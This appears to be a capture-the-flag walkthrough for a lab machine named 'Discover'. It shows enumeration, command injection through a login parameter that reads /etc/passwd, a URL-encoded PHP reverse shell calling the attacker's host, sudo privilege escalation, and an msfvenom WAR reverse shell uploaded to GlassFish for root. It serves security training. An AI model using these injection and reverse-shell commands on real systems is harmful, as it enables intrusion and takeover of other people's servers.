***Remote Machine: `10.0.0.28`***
***Local Machine: `10.0.0.27`***
***Difficulty: `Medium`***


# 1. Enumeration

    root@kali ~/D/M/Discover# nmap -sS -p- -A -T4 10.0.0.28

    PORT   STATE SERVICE VERSION                                                                              
    80/tcp open  http    Apache httpd 2.4.54                                                                  
    |_http-title: Did not follow redirect to http://discover.hmv/                                             
    |_http-server-header: Apache/2.4.54 (Debian) 

Going to ***http://10.0.0.28*** redirects to ***http://discover.hmv/***. By adding ***http://discover.hmv*** to the ***/etc/hosts*** file we can now access the remote web server.

![image](https://user-images.githubusercontent.com/76552238/191326610-257071d3-2b9f-4d96-b965-0b4c2bf84280.png)

    root@kali ~/D/M/Discover# gobuster dir -u http://discover.hmv/ -w /usr/share/wordlists/dirb/big.txt -x txt,php,html

    /aboutus.php          (Status: 200) [Size: 17734]
    /adminpanel.php       (Status: 200) [Size: 8895] 
    /assets               (Status: 301) [Size: 313] [--> http://discover.hmv/assets/]
    /chat2.php            (Status: 500) [Size: 2287]                                 
    /chat1.php            (Status: 200) [Size: 2604]                                 
    /contact.php          (Status: 200) [Size: 1363]                                 
    /contactform          (Status: 301) [Size: 318] [--> http://discover.hmv/contactform/]
    /courses              (Status: 301) [Size: 314] [--> http://discover.hmv/courses/]    
    /courses.php          (Status: 200) [Size: 19066]                                     
    /css                  (Status: 301) [Size: 310] [--> http://discover.hmv/css/]        
    /fonts                (Status: 301) [Size: 312] [--> http://discover.hmv/fonts/]      
    /forgotpassword.php   (Status: 200) [Size: 1063]                                      
    /forgotpassword.html  (Status: 200) [Size: 8647]                                      
    /home.php             (Status: 200) [Size: 29575]                                     
    /img                  (Status: 301) [Size: 310] [--> http://discover.hmv/img/]        
    /js                   (Status: 301) [Size: 309] [--> http://discover.hmv/js/]         
    /logout.php           (Status: 302) [Size: 22] [--> home.php]                         
    /manual               (Status: 301) [Size: 313] [--> http://discover.hmv/manual/]     
    /myaccount.php        (Status: 200) [Size: 6302]                                      
    /payment.php          (Status: 200) [Size: 1351]                                      
    /review.php           (Status: 200) [Size: 1277]                                      
    /server-status        (Status: 403) [Size: 277]                                       
    /statistics.php       (Status: 500) [Size: 1339]  

I tried enumerating the site but found nothing. Maybe we can find sub domains.

    root@kali ~/D/M/Discover# gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://discover.hmv | grep "Status: 200"
    Found: log.discover.hmv (Status: 200) [Size: 822]   

After adding the newly found sub domain to that ***/etc/hosts*** files we can access it.

![image](https://user-images.githubusercontent.com/76552238/191727726-3b38b757-7882-4d57-83d7-9f8f4f185f5d.png)

The ***"Submit"*** button is disabled.

![image](https://user-images.githubusercontent.com/76552238/191743128-a021da13-5b3a-4353-bf25-37511b24990f.png)

We can use it by deleting the "**disabled**" option.

![image](https://user-images.githubusercontent.com/76552238/191743324-253b1de7-1614-4f0d-8255-9ea38d3313ba.png)

After entering a pseudo password we can see that the web server is using ***GET*** instead of ***POST*** to create a user.

![image](https://user-images.githubusercontent.com/76552238/191743527-9dcaa588-66eb-4af4-b986-b53afef8082b.png)

Let's try to find vulnerabilities on the remote machine by fuzzing the parameters.  
Trying to fuzz LFI didn't work, let's see if we can perform a ***RCE***.

    root@kali ~/D/M/Discover# wfuzz -c -w /usr/share/wordlists/SecLists/Fuzzing/command-injection-commix.txt -u 'http://log.discover.hmv/index.php?username=FUZZ&password=password' --hw 51
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://log.discover.hmv/index.php?username=FUZZ&password=password
    Total requests: 8262

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                   
    =====================================================================

    000000047:   200        23 L     52 W       844 Ch      "%0aecho%20MBVQWK$((48%2B90))$(echo%20MBVQ
                                                            WK)MBVQWK"                                
    000000040:   200        23 L     52 W       843 Ch      "echo%20CWRXRJ$((77%2B13))$(echo%20CWRXRJ)
                                                            CWRXRJ"                                   
    000000041:   200        23 L     52 W       844 Ch      "%20echo%20IBQHOS$((92%2B76))$(echo%20IBQH
                                                            OS)IBQHOS"                                
    000000060:   200        23 L     52 W       845 Ch      "%0aecho%20MESJOF$((62%2B27))$(echo%20MESJ
                                                            OF)MESJOF//"                              
    000000053:   200        23 L     52 W       845 Ch      "echo%20DINEVC$((57%2B17))$(echo%20DINEVC)
                                                            DINEVC//"                                 
    000000054:   200        23 L     52 W       846 Ch      "%20echo%20BSYIFX$((64%2B71))$(echo%20BSYI
                                                            FX)BSYIFX//"                              
    000000008:   200        23 L     52 W       844 Ch      "%0aecho%20VVIEOJ$((30%2B78))$(echo%20VVIE
                                                            OJ)VVIEOJ"  

We have different output for the inputs, that means that we can run commands on the remote server. Let's try to read the ***/etc/passwd*** file on the remote server using the '***cat***' command.  
Going to ***http://log.discover.hmv/index.php?username=cat%20/etc/passwd&password=password***, we can get the output of the **/etc/passwd** file on the remote machine.

    root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin sshd:x:104:65534::/run/sshd:/usr/sbin/nologin discover:x:1000:1000:discover,,,:/home/discover:/bin/bash systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false 

# 2. Exploitation

We can see the user ***'discover'*** is on the remote machine.  
Let's try to get a reverse shell to the remote machine. After some checking I found out that the commands ***'nc'*** and ***'bash'*** are not accessible, so get a reverse shell using [***PHP***][1] or [***PYTHON***][2].

    php -r '$sock=fsockopen("10.0.0.27",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

    Url encoded - 
    %70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%30%2e%30%2e%32%37%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27
>
    Remote Machine:
    $ curl http://log.discover.hmv/index.php?username=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%30%2e%30%2e%32%37%22%2c%34%34%34%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27&password=password
>
    Local Machine:
    $ nc -lnvp
    listening on [any] 4444 ...
    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.28] 40632
    $ whoami
    www-data

# 3. Privilege Escalation

    www-data@debian:/home/discover$ sudo -ll
    sudo -ll
    Matching Defaults entries for www-data on debian:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User www-data may run the following commands on debian:

    Sudoers entry:
        RunAsUsers: discover
        Options: !authenticate
        Commands:
            /opt/overflow
>
    www-data@debian:/tmp$ sudo -u discover /opt/overflow $(python3 stdout.py)
    sudo -u discover /opt/overflow $(python3 stdout.py)
    bash: warning: command substitution: ignored null byte in input
    $ whoami
    whoami
    discover
    $cat /home/discover/User.txt 
    c7d0a8de1e03b25a6f7ed2d91b94dad6

Let's see what commands we can run as root.

    discover@debian:/opt/glassfish6/bin$ sudo -ll
    sudo -ll
    Matching Defaults entries for discover on debian:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User discover may run the following commands on debian:

    Sudoers entry:
        RunAsUsers: root
        Options: !authenticate
        Commands:
            /opt/glassfish6/bin/asadmin

Checking for asadmin commands, using **https://glassfish.org/docs/5.1.0/reference-manual/list-commands.html** we can view what commands we can run on the service.

    $ sudo /opt/glassfish6/bin/asadmin create-domain domain2
    username: admin, password: admin
    $ sudo /opt/glassfish6/bin/asadmin --port 4848 enable-secure-admin
    $ $ sudo /opt/glassfish6/bin/asadmin start-domain domain2

Going to **http://discover.hmv:4848** we can now log in with the credentials we created the domain with (admin:admin).

![image](https://user-images.githubusercontent.com/76552238/191776208-f601fdcc-957c-4c59-88bf-3ee08e382a27.png)

![image](https://user-images.githubusercontent.com/76552238/191776416-7dea16bd-52c3-4a74-800b-e8288ed63e0f.png)

We now have access to the admin panel. Going to the "***Applications***" tab, we can add a new application.
Using this [article][3] I was able to get a reverse shell by uploading a war file to the remote machine.

    Local Machine:
    $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.27 LPORT=5555 -f war > exploit.war 

    $ nc -lnvp 5555
    listening on [any] 5555 ...

On the remote machine we need to upload the war file as an application and launch it.

![image](https://user-images.githubusercontent.com/76552238/191777924-64297397-9383-495c-a9fb-ee761087b290.png)

![image](https://user-images.githubusercontent.com/76552238/191778117-13e672bb-2c26-4f48-b477-e34cf84f86ba.png)

![image](https://user-images.githubusercontent.com/76552238/191778312-ee9aba8c-0d66-4e6c-a83a-71b79d8ba68c.png)

Going to **http://discover.hmv:46801/exploit16569657734638343762/** we are able to get a connection on our local machine.

    connect to [10.0.0.27] from (UNKNOWN) [10.0.0.28] 57186
    # whoami
    # root
    # cat /root/Root.txt
    7140a59e697f44b8a8581cc85df76f4c


[1]: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php"

[2]: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python"

[3]: "https://pentestlab.blog/2012/08/26/using-metasploit-to-create-a-war-backdoor/"